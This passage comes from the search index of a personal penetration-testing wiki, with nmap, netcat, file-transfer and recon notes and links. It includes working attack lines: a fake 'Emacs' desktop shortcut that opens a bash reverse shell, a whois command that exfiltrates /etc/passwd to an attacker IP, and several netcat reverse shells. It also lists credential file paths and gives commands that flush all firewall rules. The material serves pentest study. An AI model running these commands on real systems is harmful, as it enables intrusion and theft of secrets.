Scan:"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#intense-scan-plus-udp","text":"nmap -sS -sU -T4 -A -v $ip /24","title":"Intense Scan Plus UDP"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#intense-scan-all-tcp-ports","text":"nmap -p 1 -65535 -T4 -A -v $ip /24","title":"Intense Scan ALL TCP Ports"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#intense-scan-no-ping","text":"nmap -T4 -A -v -Pn $ip /24","title":"Intense Scan - No Ping"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#ping-scan","text":"nmap -sn $ip /24","title":"Ping scan"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#slow-comprehensive-scan","text":"nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script \"default or (discovery and safe)\" $ip /24","title":"Slow Comprehensive Scan"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#scan-with-active-connect-in-order-to-weed-out-any-spoofed-ports-designed-to-troll-you","text":"nmap -p1-65535 -A -T5 -sT $ip","title":"Scan with Active connect in order to weed out any spoofed ports designed to troll you"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Recursive%20md5sum/","text":"Recursive md5sum Will run find in the current directory and execute an md5sum on all files it finds and output to a file named md5sum.txt , but will ignore the md5sum.txt as it is recursing. find -type f \\( -not -name \"md5sum.txt\" \\) -exec md5sum '{}' \\; > md5sum.txt","title":"Recursive `md5sum`"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Recursive%20md5sum/#recursive-md5sum","text":"Will run find in the current directory and execute an md5sum on all files it finds and output to a file named md5sum.txt , but will ignore the md5sum.txt as it is recursing. find -type f \\( -not -name \"md5sum.txt\" \\) -exec md5sum '{}' \\; > md5sum.txt","title":"Recursive md5sum"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/Common%20Ports/","text":"Common Ports to Remember","title":"Common Ports to Remember"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/Common%20Ports/#common-ports-to-remember","text":"","title":"Common Ports to Remember"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/John%20the%20Ripper/","text":"John the Ripper","title":"John the Ripper"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/John%20the%20Ripper/#john-the-ripper","text":"","title":"John the Ripper"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/MSFVenom%20Reverse%20Shell%20Payload/","text":"MSFVenom Reverse Shell Payload https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/","title":"MSFVenom Reverse Shell Payload"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/MSFVenom%20Reverse%20Shell%20Payload/#msfvenom-reverse-shell-payload","text":"https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/","title":"MSFVenom Reverse Shell Payload"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/Nmap/","text":"Nmap https://docs.google.com/document/d/1ekOUND30jr4RmD-QzL5XQUPPoZkbQwJgvuZ7BwlicIE/edit","title":"Nmap"},{"location":"wiki/Penetration%20Testing/Cheat%20Sheets/Nmap/#nmap","text":"https://docs.google.com/document/d/1ekOUND30jr4RmD-QzL5XQUPPoZkbQwJgvuZ7BwlicIE/edit","title":"Nmap"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Banner%20Grabbing/","text":"Establish the variable export ip = 192 .168.1.100 Netcat Banner Grab nc -v $ip 25 Telnet Banner Grab telnet $ip 25","title":"Banner Grabbing"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Banner%20Grabbing/#establish-the-variable","text":"export ip = 192 .168.1.100","title":"Establish the variable"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Banner%20Grabbing/#netcat-banner-grab","text":"nc -v $ip 25","title":"Netcat Banner Grab"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Banner%20Grabbing/#telnet-banner-grab","text":"telnet $ip 25","title":"Telnet Banner Grab"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Google%20Hacking/","text":"Google search to find website sub domains site:microsoft.com Google filetype, and intitle intitle:\"netbotz appliance\" \"OK\" -filetype:pdf Google inurl inurl:\"level/15/sexec/-/show\" Google Hacking Database: https://www.exploit-db.com/google-hacking-database/ SSL Certificate Testing https://www.ssllabs.com/ssltest/analyze.html Email Harvesting Simply Email git clone https://github.com/killswitch-GUI/SimplyEmail.git ./SimplyEmail.py -all -e TARGET-DOMAIN","title":"Google Hacking"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Google%20Hacking/#google-search-to-find-website-sub-domains","text":"site:microsoft.com","title":"Google search to find website sub domains"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Google%20Hacking/#google-filetype-and-intitle","text":"intitle:\"netbotz appliance\" \"OK\" -filetype:pdf","title":"Google filetype, and intitle"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Google%20Hacking/#google-inurl","text":"inurl:\"level/15/sexec/-/show\"","title":"Google inurl"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Google%20Hacking/#google-hacking-database","text":"https://www.exploit-db.com/google-hacking-database/","title":"Google Hacking Database:"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Google%20Hacking/#ssl-certificate-testing","text":"https://www.ssllabs.com/ssltest/analyze.html","title":"SSL Certificate Testing"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Google%20Hacking/#email-harvesting","text":"Simply Email git clone https://github.com/killswitch-GUI/SimplyEmail.git ./SimplyEmail.py -all -e TARGET-DOMAIN","title":"Email Harvesting"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Netcraft/","text":"Determine the operating system and tools used to build a site https://searchdns.netcraft.com/","title":"Netcraft"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Netcraft/#determine-the-operating-system-and-tools-used-to-build-a-site","text":"https://searchdns.netcraft.com/","title":"Determine the operating system and tools used to build a site"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Recon-ng/","text":"Recon-ng - full-featured web reconnaissance framework written in Python cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git cd /opt/recon-ng ./recon-ng show modules help","title":"Recon ng"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/Recon-ng/#recon-ng-full-featured-web-reconnaissance-framework-written-in-python","text":"cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git cd /opt/recon-ng ./recon-ng show modules help","title":"Recon-ng - full-featured web reconnaissance framework written in Python"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/WHOIS/","text":"WHOIS query whois domain-name-here.com whois $ip","title":"WHOIS"},{"location":"wiki/Penetration%20Testing/Passive%20Enumeration/WHOIS/#whois-query","text":"whois domain-name-here.com whois $ip","title":"WHOIS query"},{"location":"wiki/Penetration%20Testing/Techniques/Browser%20Forensics/","text":"Browser Forensics https://www.infosecshirish.com/browser-forensic-with-dumpzilla-on-linux-and-windows/","title":"Browser Forensics"},{"location":"wiki/Penetration%20Testing/Techniques/Browser%20Forensics/#browser-forensics","text":"https://www.infosecshirish.com/browser-forensic-with-dumpzilla-on-linux-and-windows/","title":"Browser Forensics"},{"location":"wiki/Penetration%20Testing/Techniques/Curl%20Telnet/","text":"Curl Telnet Can be used if you lack netcat , nc , or telnet . echo -e \"GET /anything HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n\" | curl telnet://example.com:80 HTTP/1.1 200 OK","title":"Curl Telnet"},{"location":"wiki/Penetration%20Testing/Techniques/Curl%20Telnet/#curl-telnet","text":"Can be used if you lack netcat , nc , or telnet . echo -e \"GET /anything HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n\" | curl telnet://example.com:80 HTTP/1.1 200 OK","title":"Curl Telnet"},{"location":"wiki/Penetration%20Testing/Techniques/DLLs/","text":"DLLs Missing DLL from Windows 2019 Ran as NT AUTHORITY\\SYSTEM (ShellHWDetection Service) system32\\fveapi.dll","title":"DLLs"},{"location":"wiki/Penetration%20Testing/Techniques/DLLs/#dlls","text":"","title":"DLLs"},{"location":"wiki/Penetration%20Testing/Techniques/DLLs/#missing-dll-from-windows-2019","text":"Ran as NT AUTHORITY\\SYSTEM (ShellHWDetection Service) system32\\fveapi.dll","title":"Missing DLL from Windows 2019"},{"location":"wiki/Penetration%20Testing/Techniques/Data%20Recovery/","text":"Data Recovery foremost","title":"Data Recovery"},{"location":"wiki/Penetration%20Testing/Techniques/Data%20Recovery/#data-recovery","text":"foremost","title":"Data Recovery"},{"location":"wiki/Penetration%20Testing/Techniques/File%20Transfers/","text":"File Transfers In the folder with your file, on your machine python -m SimpleHTTPServer 8080 Linux box: wget <your-box>:8080/<your-file> or curl <your-box>:8080/<your-file> Windows box certutil.exe -urlcache -split -f \"http://<your machine>:8080/<your-file>\" https://fir3wa1-k3r.github.io/2018/10/17/File-Transfer-cheatsheet.html https://us.v-cdn.net/6030959/uploads/attachments/2/5/7/4/4/1/7613.pdf For Windows im mostly using impackets smbserver thats included in kali (at least in the current 2020.1 version i'm using). Simply start it with: impacket-smbserver <share name> <folder to share> impacket-smbserver share /root/oscp/smbshare/ After that you can simply call executables from the share on the windows machine like this: powershell \\\\10.11.0.1\\share\\ExploitSuggester.ps1 or you can copy the file to the box via: copy \\\\10.11.0.1\\share\\ExploitSuggester.ps1 ExploitSuggester.ps1 https://sushant747.gitbooks.io/total-oscp-guide/transfering_files.html https://github.com/Cr0wTom/OSCP-PWK-Repo Book.hacktricks.xyz","title":"File Transfers"},{"location":"wiki/Penetration%20Testing/Techniques/File%20Transfers/#file-transfers","text":"In the folder with your file, on your machine python -m SimpleHTTPServer 8080 Linux box: wget <your-box>:8080/<your-file> or curl <your-box>:8080/<your-file> Windows box certutil.exe -urlcache -split -f \"http://<your machine>:8080/<your-file>\" https://fir3wa1-k3r.github.io/2018/10/17/File-Transfer-cheatsheet.html https://us.v-cdn.net/6030959/uploads/attachments/2/5/7/4/4/1/7613.pdf For Windows im mostly using impackets smbserver thats included in kali (at least in the current 2020.1 version i'm using). Simply start it with: impacket-smbserver <share name> <folder to share> impacket-smbserver share /root/oscp/smbshare/ After that you can simply call executables from the share on the windows machine like this: powershell \\\\10.11.0.1\\share\\ExploitSuggester.ps1 or you can copy the file to the box via: copy \\\\10.11.0.1\\share\\ExploitSuggester.ps1 ExploitSuggester.ps1 https://sushant747.gitbooks.io/total-oscp-guide/transfering_files.html https://github.com/Cr0wTom/OSCP-PWK-Repo Book.hacktricks.xyz","title":"File Transfers"},{"location":"wiki/Penetration%20Testing/Techniques/Interesting%20Files/","text":"Interesting Files /proc/mounts /proc/net/arp /etc/motd /etc/mysql/my.cnf /proc/net/route /proc/sched_debug /proc/self/environ /home/$USER/.bash_history /home/$USER/.ssh/id_rsa /var/run/secrets/kubernetes.io/serviceaccount /proc/self/cwd/index.php /proc/$process_id","title":"Interesting Files"},{"location":"wiki/Penetration%20Testing/Techniques/Interesting%20Files/#interesting-files","text":"/proc/mounts /proc/net/arp /etc/motd /etc/mysql/my.cnf /proc/net/route /proc/sched_debug /proc/self/environ /home/$USER/.bash_history /home/$USER/.ssh/id_rsa /var/run/secrets/kubernetes.io/serviceaccount /proc/self/cwd/index.php /proc/$process_id","title":"Interesting Files"},{"location":"wiki/Penetration%20Testing/Techniques/Jenkins/","text":"Jenkins Pentesting Notes (gquere) https://github.com/gquere/pwn_jenkins","title":"Jenkins Pentesting Notes (gquere)"},{"location":"wiki/Penetration%20Testing/Techniques/Jenkins/#jenkins-pentesting-notes-gquere","text":"https://github.com/gquere/pwn_jenkins","title":"Jenkins Pentesting Notes (gquere)"},{"location":"wiki/Penetration%20Testing/Techniques/Linux%20Backdoors%20and%20Rootkits/","text":"Linux Backdoors and Rootkits https://capsule8.com/blog/dont-get-kicked-out-a-tale-of-rootkits-and-other-backdoors/","title":"Linux Backdoors and Rootkits"},{"location":"wiki/Penetration%20Testing/Techniques/Linux%20Backdoors%20and%20Rootkits/#linux-backdoors-and-rootkits","text":"https://capsule8.com/blog/dont-get-kicked-out-a-tale-of-rootkits-and-other-backdoors/","title":"Linux Backdoors and Rootkits"},{"location":"wiki/Penetration%20Testing/Techniques/Malicious%20Desktop%20Shortcuts/","text":"Malicious Desktop Shortcuts Linux [Desktop Entry] Name=Emacs Exec=/bin/bash -i >& /dev/tcp/[RHOST]/[RPORT] 0>&1 Icon=http://bit.ly/icon-png Terminal=false Type=Application Windows [InternetShortcut] URL=file:///C:\\Users\\user\\AppData\\Roaming\\forfiles\\regsvr32.vbs[InternetShortcut] URL=file:///C:\\Users\\user\\AppData\\Roaming\\forfiles\\regsvr32.vbs Excel Sheet Macro mailto: Private Sub Form_Load() Open \"C:\\mail.url\" For Output As #1 Print #1, \"[InternetShortcut]\" Print #1, \"URL=mailto:example@example.com\" Print #1, \"IconIndex = 0\" Print #1, \"IconFile=C:\\WINDOWS\\explorer.exe\" Close #1 End Sub","title":"Malicious Desktop Shortcuts"},{"location":"wiki/Penetration%20Testing/Techniques/Malicious%20Desktop%20Shortcuts/#malicious-desktop-shortcuts","text":"","title":"Malicious Desktop Shortcuts"},{"location":"wiki/Penetration%20Testing/Techniques/Malicious%20Desktop%20Shortcuts/#linux","text":"[Desktop Entry] Name=Emacs Exec=/bin/bash -i >& /dev/tcp/[RHOST]/[RPORT] 0>&1 Icon=http://bit.ly/icon-png Terminal=false Type=Application","title":"Linux"},{"location":"wiki/Penetration%20Testing/Techniques/Malicious%20Desktop%20Shortcuts/#windows","text":"[InternetShortcut] URL=file:///C:\\Users\\user\\AppData\\Roaming\\forfiles\\regsvr32.vbs[InternetShortcut] URL=file:///C:\\Users\\user\\AppData\\Roaming\\forfiles\\regsvr32.vbs","title":"Windows"},{"location":"wiki/Penetration%20Testing/Techniques/Malicious%20Desktop%20Shortcuts/#excel-sheet-macro-mailto","text":"Private Sub Form_Load() Open \"C:\\mail.url\" For Output As #1 Print #1, \"[InternetShortcut]\" Print #1, \"URL=mailto:example@example.com\" Print #1, \"IconIndex = 0\" Print #1, \"IconFile=C:\\WINDOWS\\explorer.exe\" Close #1 End Sub","title":"Excel Sheet Macro mailto:"},{"location":"wiki/Penetration%20Testing/Techniques/Post%20Directory%20Traversal%20Enumeration/","text":"Post Directory Traversal Enumeration /proc/[0-9]*/fd/[0-9]*","title":"Post Directory Traversal Enumeration"},{"location":"wiki/Penetration%20Testing/Techniques/Post%20Directory%20Traversal%20Enumeration/#post-directory-traversal-enumeration","text":"/proc/[0-9]*/fd/[0-9]*","title":"Post Directory Traversal Enumeration"},{"location":"wiki/Penetration%20Testing/Techniques/Powershell%20Port%20Scanning/","text":"Powershell Port Scanning https://techcommunity.microsoft.com/t5/ITOps-Talk-Blog/PowerShell-Basics-How-to-Scan-Open-Ports-Within-a-Network/ba-p/924149?WT.mc_id=ITOPSTALK-reddit-abartolo","title":"Powershell Port Scanning"},{"location":"wiki/Penetration%20Testing/Techniques/Powershell%20Port%20Scanning/#powershell-port-scanning","text":"https://techcommunity.microsoft.com/t5/ITOps-Talk-Blog/PowerShell-Basics-How-to-Scan-Open-Ports-Within-a-Network/ba-p/924149?WT.mc_id=ITOPSTALK-reddit-abartolo","title":"Powershell Port Scanning"},{"location":"wiki/Penetration%20Testing/Techniques/Resources/","text":"Resources This is a mix of websites, articles, or documents that are a good reference and that I don't have documentation of it myself yet. Red Team Proxy Protocol Utilizing Nginx for Red Team engagements https://0xda.de/blog/2020/02/red-team-proxy-protocol-nginx/ Post Exploitation https://github.com/bt3gl/Pentesting_Toolkit https://github.com/n1nj4sec/pupy https://github.com/Manisso/fsociety https://github.com/sundowndev/hacker-roadmap https://github.com/huntergregal/mimipenguin https://github.com/Ne0nd0g/merlin https://github.com/Marten4n6/EvilOSX Red Team Blog https://redteams.net/ Lockdoor - A Penetration Testing framework with Cyber Security resources. https://github.com/SofianeHamlaoui/Lockdoor-Framework Pivot Cheatsheet for Pentesters https://nullsweep.com/pivot-cheatsheet-for-pentesters/","title":"Resources"},{"location":"wiki/Penetration%20Testing/Techniques/Resources/#resources","text":"This is a mix of websites, articles, or documents that are a good reference and that I don't have documentation of it myself yet. Red Team Proxy Protocol Utilizing Nginx for Red Team engagements https://0xda.de/blog/2020/02/red-team-proxy-protocol-nginx/","title":"Resources"},{"location":"wiki/Penetration%20Testing/Techniques/Resources/#post-exploitation","text":"https://github.com/bt3gl/Pentesting_Toolkit https://github.com/n1nj4sec/pupy https://github.com/Manisso/fsociety https://github.com/sundowndev/hacker-roadmap https://github.com/huntergregal/mimipenguin https://github.com/Ne0nd0g/merlin https://github.com/Marten4n6/EvilOSX","title":"Post Exploitation"},{"location":"wiki/Penetration%20Testing/Techniques/Resources/#red-team-blog","text":"https://redteams.net/","title":"Red Team Blog"},{"location":"wiki/Penetration%20Testing/Techniques/Resources/#lockdoor-a-penetration-testing-framework-with-cyber-security-resources","text":"https://github.com/SofianeHamlaoui/Lockdoor-Framework","title":"Lockdoor - A Penetration Testing framework with Cyber Security resources."},{"location":"wiki/Penetration%20Testing/Techniques/Resources/#pivot-cheatsheet-for-pentesters","text":"https://nullsweep.com/pivot-cheatsheet-for-pentesters/","title":"Pivot Cheatsheet for Pentesters"},{"location":"wiki/Penetration%20Testing/Techniques/Reviewing%20a%20URL/","text":"Reviewing a URL app.any.run virustotal urlvoid blacklist/smtp checks urlscan.io getlinkinfo.com talosintelligence.com joesandbox.com unshorten.it hybrid-analysis.com zulu.zscaler.com trustedsource.org/?p=mcaffee global.sitesafety.trendmicro.com urlfiltering.paloaltonetworks.com","title":"Reviewing a URL"},{"location":"wiki/Penetration%20Testing/Techniques/Reviewing%20a%20URL/#reviewing-a-url","text":"app.any.run virustotal urlvoid blacklist/smtp checks urlscan.io getlinkinfo.com talosintelligence.com joesandbox.com unshorten.it hybrid-analysis.com zulu.zscaler.com trustedsource.org/?p=mcaffee global.sitesafety.trendmicro.com urlfiltering.paloaltonetworks.com","title":"Reviewing a URL"},{"location":"wiki/Penetration%20Testing/Techniques/SQL%20Queries/","text":"SQL Queries Order FROM + JOIN | V WHERE | V GROUP BY | V HAVING | V SELECT (WINDOW FUNCTIONS HAPPEN HERE) | V ORDER BY | V LIMIT","title":"SQL Queries"},{"location":"wiki/Penetration%20Testing/Techniques/SQL%20Queries/#sql-queries","text":"","title":"SQL Queries"},{"location":"wiki/Penetration%20Testing/Techniques/SQL%20Queries/#order","text":"FROM + JOIN | V WHERE | V GROUP BY | V HAVING | V SELECT (WINDOW FUNCTIONS HAPPEN HERE) | V ORDER BY | V LIMIT","title":"Order"},{"location":"wiki/Penetration%20Testing/Techniques/Whois%20Exfil/","text":"Whois Exfil From attacker: nc -nvlp 53 | sed \"s/ //g\" | base64 -d From victim: whois -h <Attacker IP> -p 53 cat /etc/passwd | base64","title":"Whois Exfil"},{"location":"wiki/Penetration%20Testing/Techniques/Whois%20Exfil/#whois-exfil","text":"From attacker: nc -nvlp 53 | sed \"s/ //g\" | base64 -d From victim: whois -h <Attacker IP> -p 53 cat /etc/passwd | base64","title":"Whois Exfil"},{"location":"wiki/Penetration%20Testing/Tools/IPTables/","text":"Deny traffic to ports except for Local Loopback iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP Clear ALL IPTables firewall rules iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT iptables -t nat -F iptables -t mangle -F iptables -F iptables -X iptables -t raw -F iptables -t raw -X","title":"IPTables"},{"location":"wiki/Penetration%20Testing/Tools/IPTables/#deny-traffic-to-ports-except-for-local-loopback","text":"iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP","title":"Deny traffic to ports except for Local Loopback"},{"location":"wiki/Penetration%20Testing/Tools/IPTables/#clear-all-iptables-firewall-rules","text":"iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT iptables -t nat -F iptables -t mangle -F iptables -F iptables -X iptables -t raw -F iptables -t raw -X","title":"Clear ALL IPTables firewall rules"},{"location":"wiki/Penetration%20Testing/Tools/Linux%20Enumeration/","text":"Linux Enumeration linpeas autorecon linenum","title":"Linux Enumeration"},{"location":"wiki/Penetration%20Testing/Tools/Linux%20Enumeration/#linux-enumeration","text":"linpeas autorecon linenum","title":"Linux Enumeration"},{"location":"wiki/Penetration%20Testing/Tools/Ncat/","text":"Establish the variable export ip = 192 .168.1.100 Reverse shell from windows using cmd.exe using ssl ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl Listen on port 4444 using ssl ncat -v $ip 4444 --ssl","title":"Ncat"},{"location":"wiki/Penetration%20Testing/Tools/Ncat/#establish-the-variable","text":"export ip = 192 .168.1.100","title":"Establish the variable"},{"location":"wiki/Penetration%20Testing/Tools/Ncat/#reverse-shell-from-windows-using-cmdexe-using-ssl","text":"ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl","title":"Reverse shell from windows using cmd.exe using ssl"},{"location":"wiki/Penetration%20Testing/Tools/Ncat/#listen-on-port-4444-using-ssl","text":"ncat -v $ip 4444 --ssl","title":"Listen on port 4444 using ssl"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/","text":"Establish the variable export ip = 192 .168.1.100 Send files with nc nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe Recieve file with nc nc -nlvp 4444 > incoming.exe Create a reverse shell with Ncat using cmd.exe on Windows nc.exe -nlvp 4444 -e cmd.exe or nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe Create a reverse shell with Ncat using bash on Linux nc -nv $ip 4444 -e /bin/bash Create a reverse shell with Ncat using shell on OpenBSD (Unix) /bin/nc.traditional -e /bin/bash 1 .2.3.4 4444 Netcat for Banner Grabbing: echo \"\" | nc -nv -w1 $ip 4444","title":"Netcat"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/#establish-the-variable","text":"export ip = 192 .168.1.100","title":"Establish the variable"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/#send-files-with-nc","text":"nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe","title":"Send files with nc"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/#recieve-file-with-nc","text":"nc -nlvp 4444 > incoming.exe","title":"Recieve file with nc"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/#create-a-reverse-shell-with-ncat-using-cmdexe-on-windows","text":"nc.exe -nlvp 4444 -e cmd.exe or nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe","title":"Create a reverse shell with Ncat using cmd.exe on Windows"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/#create-a-reverse-shell-with-ncat-using-bash-on-linux","text":"nc -nv $ip 4444 -e /bin/bash","title":"Create a reverse shell with Ncat using bash on Linux"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/#create-a-reverse-shell-with-ncat-using-shell-on-openbsd-unix","text":"/bin/nc.traditional -e /bin/bash 1 .2.3.4 4444","title":"Create a reverse shell with Ncat using shell on OpenBSD (Unix)"},{"location":"wiki/Penetration%20Testing/Tools/Netcat/#netcat-for-banner-grabbing","text":"echo \"\" | nc -nv -w1 $ip 4444","title":"Netcat for Banner Grabbing:"},{"location":"wiki/Penetration%20Testing/Tools/TCPDump/","text":"Display a pcap file tcpdump -r passwordz.pcap Display ips and filter and sort tcpdump -n -r passwordz.pcap | awk -F \" \" '{print $3}' | sort -u | head Grab a packet capture on port 80 tcpdump tcp port 80 -w output.pcap -i eth0 Check for ACK or PSH flag set in a TCP packet tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap","title":"TCPDump"},{"location":"wiki/Penetration%20Testing/Tools/TCPDump/#display-a-pcap-file","text":"tcpdump -r passwordz.pcap","title":"Display a pcap file"},{"location":"wiki/Penetration%20Testing/Tools/TCPDump/#display-ips-and-filter-and-sort","text":"tcpdump -n -r passwordz.pcap | awk -F \" \" '{print $3}' | sort -u | head","title":"Display ips and filter and sort"},{"location":"wiki/Penetration%20Testing/Tools/TCPDump/#grab-a-packet-capture-on-port-80","text":"tcpdump tcp port 80 -w output.pcap -i eth0","title":"Grab a packet capture on port 80"},{"location":"wiki/Penetration%20Testing/Tools/TCPDump/#check-for-ack-or-psh-flag-set-in-a-tcp-packet","text":"tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap","title":"Check for ACK or PSH flag set in a TCP packet"},{"location":"wiki/Penetration%20Testing/Tools/Wireshark/","text":"Show only SMTP (port 25) and ICMP traffic: tcp.port eq 25 or icmp Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet: ip.src == 192 .168.0.0/16 and ip.dst == 192 .168.0.0/16 Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs: ip.src ! = xxx.xxx.xxx.xxx && ip.dst ! = xxx.xxx.xxx.xxx && sip Some commands are equal ip.addr == xxx.xxx.xxx.xxx Equals ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx ip.addr ! = xxx.xxx.xxx.xxx Equals ip.src ! = xxx.xxx.xxx.xxx or ip.dst ! = xxx.xxx.xxx.xxx","title":"Wireshark"},{"location":"wiki/Penetration%20Testing/Tools/Wireshark/#show-only-smtp-port-25-and-icmp-traffic","text":"tcp.port eq 25 or icmp","title":"Show only SMTP (port 25) and ICMP traffic:"},{"location":"wiki/Penetration%20Testing/Tools/Wireshark/#show-only-traffic-in-the-lan-192168xx-between-workstations-and-servers-no-internet","text":"ip.src == 192 .168.0.0/16 and ip.dst == 192 .168.0.0/16","title":"Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:"},{"location":"wiki/Penetration%20Testing/Tools/Wireshark/#filter-by-a-protocol-eg-sip-and-filter-out-unwanted-ips","text":"ip.src ! = xxx.xxx.xxx.xxx && ip.dst ! = xxx.xxx.xxx.xxx && sip","title":"Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:"},{"location":"wiki/Penetration%20Testing/Tools/Wireshark/#some-commands-are-equal","text":"ip.addr == xxx.xxx.xxx.xxx","title":"Some commands are equal"},{"location":"wiki/Penetration%20Testing/Tools/Wireshark/#equals","text":"ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx ip.addr ! = xxx.xxx.xxx.xxx","title":"Equals"},{"location":"wiki/Penetration%20Testing/Tools/Wireshark/#equals_1","text":"ip.src ! = xxx.xxx.xxx.xxx or ip.dst ! = xxx.xxx.xxx.xxx","title":"Equals"},{"location":"wiki/Penetration%20Testing/Training/OSCP-Like%20VMs/","text":"HackTheBox Linux Windows Challenging Lame Legacy Jail (Linux) Brainfuck Blue Falafel (Linux) Shocker Devel Devops (Linux) Bashed Optimum Hawk (Linux) Nibbles Bastard Lightweight (Linux) Beep Granny La Casa De Papel (Linux) Cronos Arctic Jeeves (Windows) Nineveh Grandpa Bart (Windows) Sense Silo Tally (Windows) Solidstate Bounty Active (Windows) Kotarak Jerry Netmon (Windows) Node Conceal Valentine Poison Sunday Tartarsauce Irked Friendzone Vulnhub Linux Beginner Intermediate Unknown Kiotrix: Level 1 (#1) Kioptrix: 2014 VulnOS: 2 Kiotrix: Level 1.1 (#2) Brainpan: 1 SickOs: 1.2 Kiotrix: Level 1.2 (#3) Mr-Robot: 1 /dev/random: scream Kiotrix: Level 1.3 (#4) HackLAB: Vulnix pWnOS: 2.0 Stapler: 1 SkyTower: 1 PwnLab: init IMF","title":"OSCP Like VMs"},{"location":"wiki/Penetration%20Testing/Training/OSCP-Like%20VMs/#hackthebox","text":"Linux Windows Challenging Lame Legacy Jail (Linux) Brainfuck Blue Falafel (Linux) Shocker Devel Devops (Linux) Bashed Optimum Hawk (Linux) Nibbles Bastard Lightweight (Linux) Beep Granny La Casa De Papel (Linux) Cronos Arctic Jeeves (Windows) Nineveh Grandpa Bart (Windows) Sense Silo Tally (Windows) Solidstate Bounty Active (Windows) Kotarak Jerry Netmon (Windows) Node Conceal Valentine Poison Sunday Tartarsauce Irked Friendzone","title":"HackTheBox"},{"location":"wiki/Penetration%20Testing/Training/OSCP-Like%20VMs/#vulnhub","text":"","title":"Vulnhub"},{"location":"wiki/Penetration%20Testing/Training/OSCP-Like%20VMs/#linux","text":"Beginner Intermediate Unknown Kiotrix: Level 1 (#1) Kioptrix: 2014 VulnOS: 2 Kiotrix: Level 1.1 (#2) Brainpan: 1 SickOs: 1.2 Kiotrix: Level 1.2 (#3) Mr-Robot: 1 /dev/random: scream Kiotrix: Level 1.3 (#4) HackLAB: Vulnix pWnOS: 2.0 Stapler: 1 SkyTower: 1 PwnLab: init IMF","title":"Linux"},{"location":"wiki/Penetration%20Testing/Training/Resources/","text":"Links Github page where you can download Windows VMs legally then hack your way through them through an unpatched vulnerability or setting up a vulnerable software. /dev/random: Sleepy uses VulnInjector, need to provide you own ISO and key. Bobby: 1 uses VulnInjector, need to provide you own ISO and key. https://github.com/enaqx/awesome-pentest Ubuntu pentest setup https://www.youtube.com/watch?v=YhUiAH5SIqk&feature=youtu.be Threat hunting linux mitr att&ck framework https://github.com/Kirtar22/Litmus_Test/blob/master/README_first.md Bug Bounty Tips, Cheat Sheets, and Resources https://youtu.be/zk7BRjAyM18 https://drive.google.com/file/d/1RhFhWfrlr_Zple_3c9zwuLCU3B-56xJ7/view?usp=drivesdk C2Hack, sharing tips and tricks for pentesters https://github.com/G123N1NJ4/c2hack Creating a CTF Step 1 - CTF-Box - CTF Box Creating with Virtual Box and Windows XP 